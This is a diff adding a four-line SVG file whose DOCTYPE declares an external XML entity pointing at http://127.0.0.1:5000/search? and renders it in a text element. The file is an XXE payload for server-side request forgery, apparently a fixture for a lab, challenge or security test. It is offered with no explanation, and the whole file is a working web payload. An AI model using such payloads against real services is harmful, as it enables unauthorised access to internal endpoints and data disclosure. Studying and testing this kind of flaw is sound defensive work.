@@ -1,0 +1,4 @@
+<!DOCTYPE document [ <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/search?"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+    <text x="10" y="20">&xxe;</text>
+</svg>
